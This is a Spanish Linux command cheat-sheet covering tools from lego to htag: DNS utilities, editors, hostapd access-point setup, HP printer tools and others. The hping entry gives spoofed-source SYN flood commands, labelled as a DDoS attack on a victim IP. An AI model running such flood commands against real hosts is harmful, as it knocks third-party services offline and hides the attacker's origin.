$ lego --email tu@email.com --domains dominio.com --http --path ./certs run (tu correo, dominio para el que se pide el certificado, validaación http-01, donde se guardará y acción)
Después de ejecutarlo, en ./certs/ se tendrá cert.pem [el certificado], key.pem [clave privada] y fullchain.pem [cert + cadena de confianza].
$ lego --email tu@email.com --domains pep.cat --http --path ./certs renew (renovar el certificado)
$ lego --email tu@email.com --dns cloudflare --domains www.dominio.com --path ./certs run (validación DNS. Requiere que la API key de Cloudflare este en las variables de entorno)
$ lego --email tu@example.com --domains dominio.com --http --path ./certs --server https://acme-staging-v02.api.letsencrypt.org/directory run (probar en entorno staging. Evita el límite de peticiones durante pruebas)


lektor
Generador de sitios web estáticos basado en Python. Lektor es un generador de sitios web estáticos. Un proyecto Lektor consiste en una colección de archivos estáticos que pueden integrarse en varias páginas HTML individuales. Lektor también puede utilizarse como un CMS, proporcionando una interfaz de administración basada en navegador para editar el contenido del sitio web y crear nuevas páginas.
$ lektor quickstart (lanza un asistente que pregunta nombre del proyecto, título, autor, carpeta de salida, idioma...)
Crea una estructura tipo:
        web-mia/
        ├── content/           # Contenido del sitio en archivos .lr [Lektor Record]
        ├── templates/         # Plantillas HTML (Jinja2)
        ├── assets/            # CSS, JS, imágenes...
        ├── models/            # Modelos de contenido
        └── lektorproject      # Configuración
$ cd web-mia
$ lektor server (lanza un servidor local en http://127.0.0.1:5000 que se recarga automáticamente cuando se hacen cambios)
Puedes tener una jerarquía como esta:
        content/
        ├── blog/
        │   ├── post1/
        │   │   └── contents.lr
        │   ├── post2/
        │   │   └── contents.lr
        ├── about/
        │   └── contents.lr
        └── contents.lr         # homepage
$ lektor build (genera todos los archivos HTML en web-mia/_build/ y esta carpeta kpuede subirse al servidor)
Entrar en el editor con el navegador en http://127.0.0.1:5000/admin para acceder al CMS visual y desde ahí se puede añadir páginas, editar texto, subir imágenes...
$ lektor deploy (subir al hosting si no está en local)


levee
Editor de pantalla extremadamente pequeña, basado en el editor "vi" de Unix pero que no tiene la mayoría de sus características como resaltado de sintaxis, múltiples ventanas, etc.
Como está basado en vi, los comandos son muy similares, pero levee solo implementa un grupo muy reducido. Los más básicos son:
        i --> Entrar en modo de inserción
        Esc --> Volver al modo normal
        h --> Mover cursor a la izquierda
        j --> Mover cursor hacia abajo
        k --> Mover cursor hacia arriba
        l --> Mover cursor a la derecha
        x --> Borrar el carácter bajo el cursor
        dd --> Borrar la línea actual
        :w --> Guardar el archivo
        :q --> Salir del editor si no hay cambios sin guardar
        :wq --> Guardar y salir
        :q! --> Salir sin guardar los cambios


lexicon
Permite manipular registros DNS [A, AAAA, CNAME, MX, NS, TXT, SPF, SOA, SRV, LOC] en múltiples proveedores [Cloudflare, DigitalOcean, Namesilo, yandex, Route53...] de DNS de forma estandarizada. Es especialmente útil en automatización, como en la configuración de certificados SSL/TLS con Let's Encrypt, ya que permite crear, listar, actualizar y eliminar registros DNS de forma programática.
$ lexicon cloudflare list example.com TXT (listar todos los registros txt de un dominio en Cloudflare)
Si se usa variables de entorno para autenticación:
        export LEXICON_CLOUDFLARE_USERNAME="myusername@example.com"
        export LEXICON_CLOUDFLARE_TOKEN="cloudflare-api-token"
$ lexicon cloudflare list example.com TXT
$ lexicon cloudflare create www.example.com TXT --name="_acme-challenge.www.example.com." --content="challenge-token" (crear un registro txt para validar un dominio con Let's Encrypt)
$ lexicon cloudflare create www.example.com TXT --name="_acme-challenge.www.example.com." --content="challenge-token" --ttl 600 (Lo mismo especificando el TTL)
$ lexicon cloudflare update www.example.com TXT --identifier="cloudflare-record-id" --content="new-challenge-token" (actualizar registro txt con el identificador de registro obtenido con list)
$ lexicon cloudflare delete www.example.com TXT --name="_acme-challenge.www.example.com." --content="challenge-token" (eliminar un registro txt)
$ lexicon cloudflare delete www.example.com TXT --identifier="cloudflare-record-id" (lo mismo usando el identificador)
$ lexicon auto create domain.net TXT --name foo --content bar (con un proveedor especial que lo detecta automáticamente)
$ lexicon --help (lista completa de provedores)
1.-
Integrar lexicon con acme.sh para automatizar la emisión de certificados. Ejemplo para Namesilo que actualiza registros cada 15 minutos.
        export PROVIDER=namesilo
        export LEXICON_NAMESILO_TOKEN="namesilo-api-token"
$ acme.sh --issue -d test.example.com --dns dns_lexicon --dnssleep 960 (espera 16 minutos para la propagación de DNS en Namesilo)


hlins
Herramienta para insertar enlaces de hipertexto en documentos HTML, utilizando una base de datos con entradas del formato "nombre = URL". Su principal característica es que no solo  permite reemplazar texto por una URL, sino que está diseñada para reconocer nombres de personas y convertirlos en enlaces a sus respectivas URLs, basándose en una base de datos predefinida.
Crear la base de datos de nombres y URLs
$ nano nombres.db
Albert Einstein = https://es.wikipedia.org/wiki/Albert_Einstein
Marie Curie = https://es.wikipedia.org/wiki/Marie_Curie
Stephen Hawking = https://es.wikipedia.org/wiki/Stephen_Hawking
Ada Lovelace = https://es.wikipedia.org/wiki/Ada_Lovelace
Linus Torvalds = https://es.wikipedia.org/wiki/Linus_Torvalds
Crear un archivo con el siguiente contenido:
$ nano documento.html
        <!DOCTYPE html>
        <html>
        <head>
            <title>Grandes Científicos</title>
        </head>
        <body>
            <h1>Grandes Figuras de la Ciencia</h1>
            <p>
                Gran científico fue Albert Einstein, por su teoría de la relatividad.
                Mente brillante fue Marie Curie, con la radioactividad.
                Nos asombró, Stephen Hawking con sus agujeros negros.
                Y Ada Lovelace, considerada la primera programadora.
                Y en informática, Linus Torvalds por crear el kernel Linux.
            </p>
            <p>
                Son también nombres importantes:
                A. Einstein y M. Curie
            </p>
        </body>
        </html>
$ hlins -d nombres.db documento.html > salida.html (ejecutar hlins)
Visualizar el contenido del archivo y se debería ver algo similar a esto:
$ nano salida.html
        <!DOCTYPE html>
        <html>
        <head>
            <title>Grandes Científicos</title>
        </head>
        <body>
            <h1>Grandes Figuras de la Ciencia</h1>
            <p>
                Gran científico fue <a href="https://es.wikipedia.org/wiki/Albert_Einstein">Albert Einstein</a>, por su teoría de la relatividad.
                Mente brillante fue <a href="https://es.wikipedia.org/wiki/Marie_Curie">Marie Curie</a>, con la radioactividad.
                Nos asombró, <a href="https://es.wikipedia.org/wiki/Stephen_Hawking">Stephen Hawking</a> con sus agujeros negros.
                Y <a href="https://es.wikipedia.org/wiki/Ada_Lovelace">Ada Lovelace</a>, considerada la primera programadora.
                Y en informática, <a href="https://es.wikipedia.org/wiki/Linus_Torvalds">Linus Torvalds</a> por crear el kernel Linux.
            </p>
            <p>
                Son también nombres importantes:
                <a href="https://es.wikipedia.org/wiki/Albert_Einstein">A. Einstein</a> y <a href="https://es.wikipedia.org/wiki/Marie_Curie">M. Curie</a>
            </p>
        </body>
        </html>
hlins reconoce no solo los nombres completos sino también las abreviaturas ["A. Einstein", "M. Curie"] y ha insertado los hipervínculos correspondientes.


hlint
Ofrece sugerencias para mejorar el código fuente Haskell ya sea directamente en la terminal o generar un informe HTML en color para revisión visual. Las sugerencias pueden ser: uso de funciones alternativas más concisas o eficientes, simplificación de expresiones, eliminación de redundancias, mejora de estilo y legibilidad, detección de posibles errores menores o malas prácticas...
$ hlint MiArchivo.hs (analizará el archivo)
Un ejemplo de salida podría ser:
        MiArchivo.hs:10:1: Warning: Use concatMap
        Found:
            concat $ map f xs
        Perhaps:
            concatMap f xs
Esto sugiere reemplazar "concat $ map f xs" por "concatMap f xs", que es más idiomático y eficiente.
$ hlint MiArchivo.hs --ignore="Use concatMap" (ignorar una sugerencia concreta)
$ hlint src/ (revisa recursivamente todos los archivos .hs y .lhs en el directorio src y subdirectorios)
$ hlint . --report (generar un informe HTML)


hnb
[Hierarchical NoteBook]. Herramienta que permite organizar diversos tipos de datos de manera jerárquica. Es especialmente útil para tomar notas, gestionar listas de tareas, organizar ideas y más y exportarlos en varios formatos, incluyendo ASCII, HTML y XML.
$ hnb (abrirá la interfaz en la terminal)
Ejemplo Práctico
Organizar una lista de tareas para un proyecto:
$ hnd
Presionar "Insert"` y escribir el nombre del proyecto, por ejemplo, "Proyecto X".
Presionar "Insert" y añadir una casilla de verificación "[ ]" seguido del texto de la tarea
        Proyecto X
          [ ] Investigar requisitos
          [ ] Diseñar arquitectura
          [ ] Implementar módulo A
          [ ] Implementar módulo B
          [ ] Probar sistema
A medida que se completan las tareas, navegar hasta las casillas de verificación y presionar la barra espaciadora para marcarlas como completadas.
Presionar / para iniciar una búsqueda.
Presionar "E" para abrir el menú de exportación.
Nota.- El paquete está huerfano de mantenimiento y no es compatible con UTF-8.


hodie
Muestra la fecha en latín.
$ hodie -n (En numeral)
$ hodie -c -v (De forma clásica)


holes
Busca funcionamientos de cero bytes en los archivos de entrada especificados (o la entrada estándar) e imprime las direcciones de inicio (en hexadecimal) así como las longitudes (en decimal).
$ holes /usr/bin/thunar
$ holes archivo.txt


hollywood
Utilidad que divide la consola en múltiples paneles para crear un autentico melodrama geek de Hollywood. Puede usarse como salvapantallas con un excelente suspenso técnico. Para finalizar la aplicación pulsar C-c
$ hollywood


honeyproxy
[python-pip]. Analiza el tráfico web. Instalación:
# pip install pyOpenSSL pyasn1 Twisted Autobahn
$ git clone --recursive git://github.com/mhils/HoneyProxy.git
$ cd HoneyProxy
# python honeyproxy.py --no-gui -a 192.168.1.15 (Arrancar el servicio)
	HoneyProxy has been started!
	Configuration Details (normal users: ignore):
	GUI: http://honey:zhw78b35ioynhg8vr4jcfmn5f326d4e4@localhost:8081/app/
	Proxy Address: 192.168.1.15:8080
	WebSocket Port: 8082
	Auth user: honey
	Auth key: zhw78b35ioynhg8vr4jcfmn5f326d4e4
Una vez instalado y arrancado el servicio, configurar el navegador para su uso en Editar/Preferencias/Avanzado/Red/Configurar la conexión, clicar en "Configuración manual del proxy" y en servidor intermediario de HTTP porner la ip de la máquina local o remota puesta al arrancar la aplicación [192.168.1.15 en este caso] y el puerto 8080. Los informes, colocando en la barra de navegación la dirección que muestra al arrancar el servicio, en este caso: http://honey:zhw78b35ioynhg8vr4jcfmn5f326d4e4@localhost:8081/app/ (usuario: honey y key: zhw78b35ioynhg8vr4jcfmn5f326d4e4). Por defecto los informes se guardan en ./dump/sites. Para parar el servicio, matar el proceso:
	$ ps aux | grep honeyproxy
	$ kill -9 PID


hopm
[Hybrid Open Proxy Monitor]. Es un bot de monitorización de proxy abierto diseñado para monitorizar las conexiones a un servidor individual, especialmente utilizado en redes IRC. Su propósito principal es detectar y bloquear usuarios que se conectan desde proxies abiertos o vulnerables y escanear las direcciones IP de los usuarios que se conectan al IRC, buscando proxies HTTP, SOCKS4, SOCKS5, y WinGate mal configurados.
$ hopm (ejecutarlo sin parámetros si el archivo de configuración por defecto es correcto)
$ hopm -f /etc/hopm/hopm.conf (lanza el bot usando el archivo de configuración especificado)
Ejemplo de archivo de configuración
3 nano hopm.conf
        general {
            name = "MiServidorIRC";
            description = "Monitor de proxies";
            motd = "Bienvenido al escáner de proxies!";
        }
        #
        scanner {
            dnsbl = "dnsbl.proxybl.org";
            max_read = 8192;
            timeout = 30;
        }
        #
        target {
            ip = "127.0.0.1";
            port = 6667;
            password = "mi_clave";
            myname = "ProxyScanBot";
        }
Este archivo configura el escáner para que actúe sobre conexiones entrantes al puerto 6667, típico de IRC, en 127.0.0.1.
Nota.- El directorio de logs en /var/log/hopm/.


horizon-tempest-plugin
Es un conjunto de pruebas de integración que se ejecutan en un clúster de OpenStack en vivo para garantizar que Horizon, el dashboard de OpenStack, funcione correctamente en un entorno real.
Configuración de Tempest para Horizon
# nano /etc/tempest/tempest.conf
        [dashboard]
        dashboard_url = http://<IP_HORIZON>:80
        login_url = http://<IP_HORIZON>:80/auth/login/
$ tempest run --plugin horizon-tempest-plugin (ejecutar todas las pruebas del plugin)
Al ejecutar las pruebas, se verá un resumen como:
horizon_tempest_plugin.tests.scenario.test_login ... OK
horizon_tempest_plugin.tests.scenario.test_create_instance ... SKIPPED
        OK --> Prueba exitosa.
        SKIPPED --> Prueba omitida (dependencias no cumplidas).
        FAIL --> Error (indica un problema en Horizon o su integración).


horst
Herramienta diseñada para escanear y analizar redes inalámbricas IEEE 802.11 [Wi-Fi] y procesar, en tiempo real, esta información para mostrar detalles relevantes sobre las redes, los clientes conectados y clientes intentando asociarse o realizando escaneos y el tráfico. Para usar horst, primero es asegurarse de que la interfaz inalámbrica pueda operar en modo monitor lo que requiere herramientas como airmon-ng [ver airmon].
# horst -i wlan0mon (abrirá la interfaz interactiva, donde muestra una lista de redes detectadas, clientes, y estadísticas de tráfico)
# horst -i wlan0mon -V stats ( muestra estadísticas detalladas por cada BSSID [punto de acceso] y por cliente)
# horst -i wlan0mon -V essid (organiza la información por ESSID)
# horst -i wlan0mon -V spectrum ( ofrece una representación visual de la actividad en los canales)
# horst -i wlan0mon -C 6 (enfocar a un canal específico)
# horst -i wlan0mon -e 00:11:22:33:44:55 (filtrar los paquetes para que solo se muestren aquellos que provienen de una dirección MAC específica)
# horst -i wlan0mon -e AA:BB:CC:DD:EE:FF -e 11:22:33:44:55:66 (ver solo los paquetes de tu router y tu dispositivo)
# horst -i wlan0mon -b 1000000 (si se está perdiendo paquetes bajo carga, aumentar el tamaño del búfer de recepción)
# horst -i wlan0mon -o paquetes.log (registrar información sobre cada paquete recibido en un archivo)
Nota.- Al terminar, detener el modo monitor.


host
Determina la ip de un registro DNS o, a partir de una ip, el nombre de registro
$ host google.com
$ host google.com 8.8.8.8
$ host -v -a telefonica.com
$ host -t SOA google.com
$ host -R 3 google.es (Eleva a 3 el número de intentos para obtener respuesta. Por defecto 1)
$ host -C google.es (Muestra los registros SOA y los servidores de nombres autorizados.)
Tipos de registros
	A (Registro de dirección que resuelve un nombre de un anfitrión hacia una dirección IPv4)
	AAA (Registro de dirección que resuelve un nombre de un anfitrión hacia una dirección IPv6)
	MX (Registro de servidor de correo que sirve para definir una lista de servidores de correo para un dominio, así como la prioridad, el que tiene el número más bajo de los servidores de correo es el que tiene mayor prioridad.)
	PTR (Registro de apuntador que resuelve direcciones IPv4 hacia el nombre anfitriones. Es decir, hace lo contrario al registro A. Se utiliza en zonas de Resolución Inversa)
	NS (Registro de servidor de nombres que sirve para definir una lista de servidores de nombres con autoridad para un dominio)
	SOA (Registro de inicio de autoridad que especifica el Servidor DNS Maestro (o Primario) que proporcionará la información con autoridad acerca de un dominio de Internet, dirección de correo electrónico del administrador, número de serie del dominio y parámetros de tiempo para la zona)
	SRV (Registro de servicios que especifica información acerca de servicios disponibles a través del dominio)
	CNAME (Registro de nombre canónico que hace que un nombre sea alias de otro)


host.conf
(/etc/host.conf). Archivo que contiene el orden de cómo serán ejecutadas las resoluciones que requiera el "Host". Algunos parámetros:
**order hosts,bind,nis** (que cualquier tipo de resolución primero consulte el archivo /etc/hosts , en segundo lugar a BIND y si aún no se ha logrado la resolución, intentar con NIS)
	BIND (Llamada al servidor de nombres)
	NIS ("Network Information Server" es un sistema de resolución desarrollado por Sun Microsystem's , su implementación generalmente esta limitada a intranets y utiliza una metodología diferente a la usada por BIND
**multi on** (Que devuelva más de un resultado si existen alias ya que un host puede tener varias direcciones IP y la dirección IP puede coincidir con varios nombres de host. Por defecto es off [sólo se muestra el primero] )
**spoofalert on** (Intentar encontrar el nombre de host de una dirección IP. Si la aplicación no devuelve el resultado correcto, puede significar que una máquina intenta hacerse pasar por lo que no es.)
**nospoof on** (rechaza los resultados que no pasan la prueba de robo de identidad)
**reorder on** (intenta reordenar las direcciones de host para que las direcciones locales [misma subred] se listen en primer lugar)


hostapd
[Host Access Point Daemon]. Software que convierte una tarjeta de red inalámbrica o incluso una tarjeta Ethernet, aunque su uso principal es Wi-Fi en un punto de acceso [AP]. Va más allá de las capacidades básicas de un controlador de kernel IEEE 802.11 al implementar características avanzadas de seguridad y autenticación lo que permite crear una red Wi-Fi con opciones de seguridad robustas como WPA2/WPA3, autenticación basada en RADIUS y soporta la generación y gestión dinámica de claves de cifrado para WEP, WPA/WPA2 (TKIP y CCMP) y WPA3 [CCMP/GCMP]
Configuración básica para crear una red Wi-Fi personal y segura:
# nano /etc/hostapd/hostapd.conf
        # Interfaz de red inalámbrica
        interface=wlan0
        # Driver del controlador (se detecta automáticamente, pero se puede especificar)
        # driver=nl80211
        # driver=atheros
        #
        # Nombre de la red (SSID)
        ssid=MiRedWiFiSegura
        #
        # Canal Wi-Fi (1-11 en 2.4GHz, más en 5GHz)
        channel=6
        #
        # Modo de operación (a=IEEE 802.11a, b=IEEE 802.11b, g=IEEE 802.11g, ad=IEEE 802.11ad)
        # Si la tarjeta soporta 802.11n, se puede dejar como "g" o especificar "n" si hostapd
        # lo soporta específicamente con el driver
        # Para 2.4 GHz, "g" es común.
        hw_mode=g
        #
        # Protección de privacidad (opcional, ayuda en redes con dispositivos antiguos)
        # ieee80211n=1 # Habilitar 802.11n si el hardware lo soporta
        # wmm_enabled=1 # Habilitar Wi-Fi Multimedia
        #
        # WPA y autenticación (WPA2-Personal)
        wpa=2
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
        wpa_passphrase=TuContraseñaSeguraAqui # ¡Cámbiala! Debe tener al menos 8 caracteres
Configurar la interfaz de red con una dirección IP para la interfaz que será el punto de acceso. Puede hacerse con dhcp o de forma estática.
Cpnfigurar la IP para DHCP:
# nano /etc/dnsmasq.conf
        interface=wlan0
         dhcp-range=192.168.1.100,192.168.1.200,12h
         # Esto asigna IPs del .100 al .200 con un lease de 12 horas
Y luego configurar wlan0 con una IP estática;
# ip addr add 192.168.1.1/24 dev wlan0
# ip link set wlan0 up
Habilitar el reenvío de paquetes [NAT/Masquerading] para compartir Internet:
# sysctl -w net.ipv4.ip_forward=1
# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # Cambia eth0 por tu interfaz de salida a Internet
# iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
# iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
# Para guardar las reglas de iptables permanentemente, se necesita el paquete iptables-persistent
# netfilter-persistent save
# systemctl enable hostapd (para que se inicie en el arranque)
# systemctl status hostapd (verificar el estado)
Para controlar qué dispositivos pueden conectarse según sus direcciones MAC.
# nano /etc/hostapd/hostapd.conf
        interface=wlan0
        ssid=MiRedMACFiltrada
        channel=1
        #
        hw_mode=g
        wpa=2
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
        wpa_passphrase=ContraseñaMAC
        #
        # Filtrado de MAC
        macaddr_acl=1 # 0=deshabilitado, 1=permitir de la lista, 2=denegar de la lista
        accept_mac_file=/etc/hostapd/mac_permitidas # Archivo con las MACs permitidas
macaddr_acl=1 --> Que solo las direcciones MAC listadas en accept_mac_file podrán conectarse.
macaddr_acl=2 --> Que las MACs listadas en deny_mac_file [se tiene que crear ese archivo] no podrán conectarse, y todas las demás sí.
# nano /etc/hostapd/mac_permitidas
        # 00:11:22:33:44:55
        # AA:BB:CC:DD:EE:FF
        ...
# journalctl -f -u hostapd (ver los logs en tiempo real y depurar problemas)
$ iw list (verificar que la tarjeta sea compatible. Puedes verificarlo con el modo AP)
$ $ iw dev wlan0 scan dump (elegir un canal Wi-Fi que no esté saturado para un mejor rendimiento)


hostfiles
Herramienta diseñada para gestionar múltiples conjuntos de archivos host. Los fragmentos de archivos host se almacenan en el directorio /etc/hostfiles/. Cada fragmento es un archivo que contiene entradas de hosts que pueden ser activadas o desactivadas. Cuando se activa un fragmento, hostfiles lee el contenido del archivo correspondiente en /etc/hostfiles/ y lo añade al archivo /etc/hosts. Cuando se desactiva un fragmento, hostfiles elimina las entradas correspondientes a ese fragmento del archivo /etc/hosts.
Supongamos un fragmento con el siguiente contenido:
# nano /etc/hostfiles/fragmento1
        192.168.1.10 ejemplo1.com
        192.168.1.11 ejemplo2.com
# hostfiles activate fragmento1 (activar este fragmento y añadir sus entradas a /etc/hosts)
# hostfiles deactivate fragmento1 (desactivar el fragmento1 y eliminar sus entradas de /etc/hosts)
# hostfiles list (listar los fragmentos que están actualmente activados)


hostid
Muestra la identificación en hexadecimal del presente host.
$ hostid


hostname
Mostrar/modificar el hostname.
$ hostname -a (el alias de la maquina)
$ hostname -i (la IP del ordenador)
$ hostname -s (el nombre de la maquina)
1.-
Pasos para modificar el hostname:
# nano /etc/hosts
Y modificar la segunda linea:
127.0.0.1       localhost
127.0.1.1       nuevo_nombre
# nano /etc/hostname
Suprimir el nombre existente por nuevo_nombre
Lanzar el comando:
# hostname nuevo_nombre
Reiniciar.


hostnamectl
Comando similar a hostname pero más moderno. Muestra el nombre de host, el sistema operativo, el kernel y la arquitectura usada entre otros datos.
$ hostnamectl (muestra los datos del sistema)
$ hostnamectl status (lo mismo que la anterior)
# hostnamectl set-hostname nombre_maquina (define el hostname)


hosts
(/etc/hosts). Contiene la resolución de "Hosts" definidos localmente. La estructura es: IP, nombre del host.
	127.0.0.1       localhost
	127.0.1.1       tux
	192.168.1.10    crontux.zzzz.org
1.-
Configurar bloqueo de páginas web:
	# nano /etc/hosts
Y debajo de:
	127.0.0.1 localhost
	127.0.1.1 tux
Añadimos, después de la ip local, las que se quieran bloquear separadas por un espacio:
	127.0.0.1 www.porn.net www.google.es www.microsoft.com


hostsed
Herramienta para editar el archivo de hosts (por defecto /etc/hosts), puede agregar o eliminar una entrada DNS a través del shell de línea de comando. Hotsed proporciona una experiencia de línea de comandos idemponente con sus comandos 'agregar' y 'eliminar' que evitan entradas duplicadas o faltantes en el archivo de hosts.
$ hostsed add hostname (añadir un host en /etc/hosts)
$ hostsed del hostname (suprimir un host de /etc/hosts. Con el mismo resultado puede usarse ademas de "del", "rm", delete y "remove")
$ hostsed drop hostname (Eliminar líneas con IP o nombre de host especificado del archivo /etc/hosts)


how-can-i-help
El paquete se integra con APT para listar oportunidades de contribución a Debian con paquetes huérfanos [sin mantenedor asignado], errores etiquetados como "newcomer" [nuevos colaboradores], paquetes eliminados o próximos a ser eliminados para los paquetes instalados localmente, tras cada invocación de APT. También se puede invocar directamente y, a continuación, lista todas las oportunidades de contribución, no solo las nuevas.
$ how-can-i-help (mostrará una lista de todos los paquetes instalados que presentan oportunidades de colaboración)
$ how-can-i-help --old --show newcomer (mostrar errores etiquetados como "newcomer")


howdoi
Consultar en StackOverflow alguna pregunta relacionada con programación, codificación, obtener ayuda en sintaxis, buscar bibliotecas para un propósito específico, resolver errores, usar funciones predefinidas y sus aplicaciones, etc.
$ howdoi commit on git
$ howdoi comment bash
$ howdoi redirect webpage


howm
[Hitori Otegaru Wiki Modoki en japonés significa algo así como “una wiki simple y personal”]. Es una herramienta para tomar notas en Emacs usando archivos de texto plano y permitiendo búsquedas, enlaces entre notas, listas de tareas, etc. No es un ejecutable independiente, sino un conjunto de archivos Lisp que se cargan dentro de Emacs.
Configuración básica de howm en Emacs
Agregar lo siguiente al archivo de configuración de emacs
$ nano ~/.emacs.d/init.el
        (add-to-list 'load-path "/usr/share/emacs/site-lisp/elpa-src/howm-1.4.8/")
        (require 'howm)
        (howm-mode t)
        (setq howm-directory "~/.howm") ;; Carpeta donde se guardarán las notas
        (setq howm-menu-file "menu.howm")
        (setq howm-file-name-format "%d/%m/%Y-%H%M%S.howm")
$ mkdir -p ~/.howm (crear el directorio)
Una vez cargado howm, los comandos principales son:
        M-x howm-menu --> Muestra el menú principal de Howm
        M-x howm-create --> Crear una nueva nota
        M-x howm-list-recent --> Ver notas recientes
        M-x howm-list-all --> Ver todas las notas
        M-x howm-search --> Buscar texto en las notas
        M-x howm-reminder --> Ver recordatorios o tareas pendientes
Nota.- Tambien en preferible, si se instalan paquetes elpa para emacs desde los repositorios de la distribución, añadir al archivo de configuración .init.el la linea:
        (add-to-list 'load-path "/usr/share/emacs/site-lisp/")


hoz
Permite dividir [split] archivos grandes en partes más pequeñas y, posteriormente, volver a unirlos [paste]. Utiliza el mismo formato que el programa Hacha. ghoz es la versión gráfica.
$ hoz -c 700M -o ~/partes video_vacaciones.mp4 (dividir el archivo en trozos de 700 MB y que se guarden en ~/partes)
$ hoz -p video_vacaciones.mp4.0 (en el mismo directorio de los trozos, unir las piezas)
Nota.- Solo se necesita especificar el nombre de la primera pieza, la que termina en .0 y hoz automáticamente buscará las piezas siguientes, .1, .2, etc. para reconstruir el archivo completo.
$ hoz -v -p -f video_vacaciones.mp4.0 (fuerza la sobrescritura del archivo si ya existe y muestra una salida más detallada)


hp-check
[hplip]. Comprueba versiones, dependencia y permisos de HPLIP de la impresora HP. Crea un log en el directorio en el que se lanza con el nombre hp-check.log
$ hp-check -g (en modo debug. -t en texto plano.)


hp-doctor
[hplip]. Herramienta que comprueba versiones en desuso, complementos, dependencias, colas, permisos y proporciona procedimientos de autodiagnóstico de la impresora HP.
$ hp-doctor -g (modo debug)


hp-info
[hplip]. Muestra parametros de información de la impresora HP.
$ hp-info -g (en modo debug)


hp-levels
[hplip]. Muestra información gráfica sobre la carga de tinta de la impresora HP.
$ hp-levels -c -a '$' (en color y que use el simbolo "$" para el gráfico)


hplip
Soporte de HP para la mayoría de las impresoras de inyección de tinta HP y muchas LaserJets, tanto para escanear, enviar faxes y para el acceso a tarjetas fotográficas en la mayoría de las impresoras multifuncionales de la marca. Algunos de los comandos disponibles, a parte de algunos que estan directamente relacionados son: hp-align, hp-clean, hp-colorcal, hp-config_usb_printer, hp-firmware, hp-logcapture, hp-makeuri, hp-pkservice, hp-plugin, hp-probe, hp-query, hp-setup, hp-testpage y hp-timedate.
# hp-setup -i (detecta automáticamente impresoras conectadas por USB y las configura en CUPS en modo interactivo)
# hp-setup -i -b net (detecta automáticamente impresoras conectadas en red y las configura en CUPS)
El asistente guiará paso a paso: Detecta la impresora, permite elegir el driver [PPD] adecuado e instalarlo automaticamente, instala plugins necesarios y registra la impresora en CUPS.


hp-scan
[hplip]. Herramienta de escaneo para una impresora HP.
$ hp-scan -g -m color (scanea una HP en collor [gray para blanco y negro] y guarda el resultado por defecto con el nombre hpscan001.jpg)
$ hp-scan -f scan.jpg --pdf=evince (guardarlo como scan.jpg y visualizarlo al final con evince)


hpcc
Prueba de rendimiento HPC Challenge. La prueba de rendimiento de computación de alto rendimiento [High Performance Computing - HPC] ejecuta un conjunto de siete pruebas que miden el rendimiento de la CPU, la memoria y la red en clústeres de HPC.
$ cp /usr/share/doc/hpcc/examples/_hpccinf.txt .
$ mv _hpccinf.txt hpccinf.txt
$ hpcc


hping
Herramienta de intrusión remota (ataque ICMP)
# hping3 -I eth0 -S 192.169.2.2  (ping no silencioso)
# hping3 -I eth0 -a 192.168.2.158 -S 192.169.2.2  (enmascarando  nuestra IP con una de ficticia-192.168.1.158)
# hping3 -I eth0 -a 192.168.2.158 -S 192.168.2.2 -p 135 (Descubrir máquinas que con un ping no responden, enmascarando la IP y especificando un puerto)
# hping3 -S -a ip_ficticia -p 80 -k ip_atacada
# hping3 -i m100 -S -a ip_ficticia -p 80 -k ip_atacada
# hping3 -S 192.168.1.158 --flood --rand-source -d 5000 -p 80 (Enviando paquetes lo más rápido posible [flood], simulando orígenes aleatorios [rand-source], tamaño del paquete en bites [d] y puerto de entrada)
# hping3 --rand-source -p 80 -S --flood ip_victima (ataque DDos a una ip)


hsetroot
Coloca imágen en el fondo de pantalla permitiendo modificar: brillo, contraste, transparencias...
$ hsetroot -clear "#f6f6f6" (Borra el rango de color especificado)
$ hsetroot -center imagen.jpg (coloca la imagen centrada. Otras opciones: -tile: mosaico, -full: respetando proporciones y -fill: redimensiona al tamaño de la pantalla)
$ hsetroot -blur 1.5 imagen.jpg (desenfoca)
$ hsetroot -contrast 30 imagen.jpg (Ajusta el contraste al valor)
$ hsetroot -flipv imagen.jpg (Refleja la imagen vertical. -fliph: horizontal y -flipd: diagonal)
$ hsetroot -alpha 150 imagen.jpg


hstr
[HiSTory seaRch]. Herramienta que mejora significativamente la experiencia de búsqueda en el historial de comandos de bash y zsh. Su objetivo es que la finalización sea más sencilla y eficiente que Ctrl+r. HSTR también puede administrar el historial de comandos, por ejemplo, puede eliminar comandos obsoletos o que contengan información confidencial o guardar sus comandos favoritos.
Añadir estas líneas a ~/.bashrc o ~/.zshrc:
$ hstr -s (ver la configuración por si se desea incorporar a ~/.bashrc. En caso afirmativo...)
$ hstr --show-configuration >> ~/.bashrc
Para incorporarlo de forma manual:
$ nano ~/.bashrc
        # Configuración de hstr
        export HSTR_CONFIG=hicolor,case-sensitive,raw-history-view
        alias hh=hstr                    # alias
        # Vincular hstr a Ctrl+r
        bind '"\C-r": "\C-a hstr -- \C-j"'
        export HSTR_PROMPT="buscar> "
hicolor --> colores resaltados
case-sensitive --> búsqueda sensible a mayúsculas
raw-history-view --> mostrar historial sin procesar
$ source ~/.bashrc (recargar la configuración)
$ hstr (entrar en el historial)
Una vez dentro de hstr:
        Escribir --> para filtrar comandos en tiempo real
        Flechas --> navegar por los resultados
        Enter --> ejecutar el comando seleccionado
        Tab --> editar el comando antes de ejecutar
        Ctrl+f --> añadir a favoritos
        Del --> eliminar comando del historial
        Ctrl+g --> salir
$ hstr git
$ hstr -f (ver solo comandos favoritos)
$ hstr --kill-last-command (elimina el último comando)
$ hstr --show-configuration (muestra configuración actual)
Nota.- hstr muestra automáticamente estadísticas como: comandos más usados, ranking de frecuencia e historial organizado por tiempo.


ht
Este programa es un visor, editor y analizador de archivos de texto, binarios y, especialmente, ejecutables.
$ hte -t archivo.bin (cargar archivo en modo editor de texto)
$ hte -b archivo (cargar archivo en modo editor hexadecimal)
$ hte -a archivo (intentar adivinar el tipo de archivo)


htag
Herramienta diseñada para agregar y gestionar eslóganes o signatures [firmas] que se pueden añadir automáticamente a correos electrónicos, publicaciones en foros, mensajes de Usenet o redes como FidoNet.
$ nano ~/.slogans (crear un archivo de firmas)
        ¡Vive y deja vivir!
        %
        La vida es un misterio, no un problema por resolver.
        %
        Enviado desde mi máquina Linux con amor.
        %
        "Si no está roto, no lo arregles." - Proverbio informático
